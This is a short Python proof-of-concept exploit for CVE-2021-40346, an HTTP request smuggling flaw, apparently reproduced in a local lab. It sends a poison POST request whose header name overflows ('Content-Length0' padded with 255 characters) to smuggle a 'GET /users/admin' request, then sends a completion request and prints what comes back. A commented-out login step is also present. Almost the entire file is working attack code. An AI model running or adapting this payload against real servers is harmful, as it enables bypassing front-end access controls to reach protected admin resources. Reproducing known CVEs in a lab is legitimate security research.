#!/usr/bin/env python3
import socket
import time

TARGET = "127.0.0.1"
PORT = 8080

print("CVE-2021-40346: Two-Request Technique (JFrog Method)")

# body = "username=alice&password=alice123"
# login = f"POST /login HTTP/1.1\r\nHost: {TARGET}:{PORT}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n\r\n{body}".encode()

sock = socket.socket()
sock.connect((TARGET, PORT))
# sock.sendall(login)
# resp = b""
# sock.settimeout(0.3)
# while True:
#     chunk = sock.recv(4096)
#     if not chunk:
#         break
#     resp += chunk
# sock.close()

# session = resp.decode().split('session=')[1].split(';')[0]
# print(f" Session: {session[:35]}...")

print("\n Sending poison request (incomplete smuggled request)...")

smuggled_incomplete = f"GET /users/admin HTTP/1.1\r\nDUMMY:"

overflow_header = "Content-Length0" + ("a" * 255)

poison = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {TARGET}:{PORT}\r\n"
    f"{overflow_header}:\r\n"
    f"Content-Length: {len(smuggled_incomplete)}\r\n"
    f"\r\n"
    f"{smuggled_incomplete}"
).encode()

sock = socket.socket()
sock.connect((TARGET, PORT))
sock.sendall(poison)

resp1 = sock.recv(4096)
print(f"   Poison sent, got: {resp1.decode()[:60]}...")
print("\nSending completion request...")

completion = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {TARGET}:{PORT}\r\n"
    f"\r\n"
).encode()

sock.sendall(completion)

all_data = b""
sock.settimeout(1)
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        all_data += chunk
except:
    pass
sock.close()

text = all_data.decode('utf-8', errors='ignore')

print(f"\n[RESULTS] {len(all_data)} bytes received")
print(text)